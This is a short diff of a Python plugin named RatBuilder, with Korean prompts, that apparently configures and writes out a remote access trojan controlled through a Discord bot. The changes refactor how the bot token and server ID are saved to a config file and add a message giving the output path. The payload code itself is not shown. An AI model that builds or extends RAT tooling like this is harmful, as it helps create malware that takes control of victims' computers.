@@ -536,22 +536,27 @@ class RatBuilder(PluginABC):
         token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 봇 토큰: ')
         guild_id = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 서버 아이디: ')
 
-        f = open("../../dist/rat/bot_conf.json", "w")
-        f.write(json.dumps({ # tabnine으로 자동완성된 코드 부분
+        data = {
             "token": token,
             "guild_id": guild_id
-        })) # tabnine 은 코드 자동완성 도우미임
+        }
+
+        with open('../../dist/rat/bot_conf.json', 'w') as f:
+            json.dump(data, f, indent=4)
+
         f.close()
 
         if option == 1:
+            name = "stable"
             f = open("stable.py", "w")
             f.write(stable)
         elif option == 2:
+            name = "rat"
             f = open("rat.py", "w")
             f.write(code)
         else:
             await importlib.import_module("main").Hydron()
-
+        print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 프로그램이 완성되었습니다. dist/rat/{name}에 위치해있습니다.\n')
         input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
         f.close()
         await importlib.import_module("main").Hydron()
